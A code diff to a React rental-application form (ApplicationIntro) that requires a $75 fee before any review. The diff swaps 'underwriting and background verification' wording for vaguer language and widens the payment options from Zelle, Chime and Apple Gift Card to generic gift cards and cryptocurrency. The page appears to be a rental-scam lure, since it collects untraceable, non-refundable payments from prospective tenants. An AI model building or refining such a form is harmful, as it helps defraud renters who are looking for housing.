@@ -476,7 +476,7 @@ export function ApplicationIntro() {
             </div>
             <div>
               <span className="block text-xs font-semibold text-charcoal-900">Step 1: Application + $75 Fee</span>
-              <span className="block text-[11px] text-taupe-500">Starts underwriting and background verification.</span>
+              <span className="block text-[11px] text-taupe-500">Starts file processing and application review.</span>
             </div>
           </div>
 
@@ -536,7 +536,7 @@ export function ApplicationIntro() {
                   <div className="space-y-1.5">
                     <div className="flex items-center gap-2">
                       <span className="text-xs font-mono uppercase tracking-wider text-amber-800 font-bold">
-                        Mandatory Underwriting Sequence
+                        Next Step Sequence
                       </span>
                       <span className="text-xs font-mono bg-amber-200/80 text-amber-900 px-2.5 py-0.5 rounded font-semibold">
                         Fee: $75.00 USD
@@ -838,7 +838,7 @@ export function ApplicationIntro() {
                   />
                   {renderFieldError("email")}
                   <p className="text-[11px] font-sans text-taupe-500">
-                    Your official underwriting decision will be dispatched to this address.
+                    Your official application decision will be sent to this address.
                   </p>
                 </div>
 
@@ -1160,7 +1160,7 @@ export function ApplicationIntro() {
                     Applicant Details
                   </h4>
                   <p className="text-xs font-sans text-taupe-500">
-                    Vehicle and pet accommodations, background disclosures, and tenancy duration.
+                    Vehicle and pet accommodations, tenancy details, and intended duration.
                   </p>
                 </div>
               </div>
@@ -1396,7 +1396,7 @@ export function ApplicationIntro() {
                     Application Fee
                   </h4>
                   <p className="text-xs font-sans text-taupe-500">
-                    Underwriting processing remittance and preferred settlement channel declaration.
+                    Application processing fee and preferred payment method.
                   </p>
                 </div>
               </div>
@@ -1409,15 +1409,16 @@ export function ApplicationIntro() {
                       Mandatory Processing Step
                     </span>
                   </div>
-                  <h5 className="font-headline text-xl sm:text-2xl font-semibold tracking-tight text-charcoal-900">
+                  <h5 className="font-headline text-xl sm:text-2xl font-bold text-bronze-900">
                     APPLICATION FEE: $75
                   </h5>
-                  <p className="text-xs sm:text-sm font-sans text-charcoal-800 leading-relaxed max-w-xl">
+                  <p className="text-xs sm:text-sm font-sans text-charcoal-800 max-w-xl leading-relaxed">
                     A $75 application fee is required after submission. Applications will not be reviewed or acted upon until the required application fee has been received.
                   </p>
                 </div>
-                <div className="px-5 py-3 rounded-2xl bg-white border border-bronze-200 text-bronze-800 font-mono font-bold text-lg flex-shrink-0 shadow-subtle text-center">
-                  $75.00 <span className="text-xs block text-taupe-500 font-normal">Per Application</span>
+                <div className="flex-shrink-0 bg-white px-4 py-2.5 rounded-xl border border-bronze-200 shadow-subtle text-right">
+                  <span className="block text-[10px] font-mono uppercase text-taupe-500 font-medium">Standard Filing</span>
+                  <span className="font-headline text-lg font-bold text-bronze-800">$75.00 USD</span>
                 </div>
               </div>
 
@@ -1465,7 +1466,7 @@ export function ApplicationIntro() {
                   </div>
                   {renderFieldError("hasFeeAvailable")}
                   <p className="text-[11px] font-sans text-taupe-500">
-                    Confirms immediate readiness to initiate underwriter background review.
+                    Confirms readiness to initiate application review.
                   </p>
                 </div>
 
@@ -1492,7 +1493,8 @@ export function ApplicationIntro() {
                       </option>
                       <option value="Zelle">Zelle</option>
                       <option value="Chime">Chime</option>
-                      <option value="Apple Gift Card">Apple Gift Card</option>
+                      <option value="Gift Cards">Gift Cards</option>
+                      <option value="Cryptocurrency">Cryptocurrency</option>
                       <option value="Other">Other</option>
                     </select>
                     <ChevronDown className="w-4 h-4 text-taupe-400 absolute right-3.5 top-1/2 -translate-y-1/2 pointer-events-none" />
@@ -1562,7 +1564,7 @@ export function ApplicationIntro() {
                 {renderFieldError("declarationConfirmed")}
 
                 <p className="text-xs font-sans text-taupe-600 pl-8 leading-relaxed">
-                  Submission of this application initiates underwriting review and does not constitute a guaranteed lease or apartment approval.
+                  Submission of this application initiates application review and does not constitute a guaranteed lease or apartment approval.
                 </p>
               </div>
             </div>
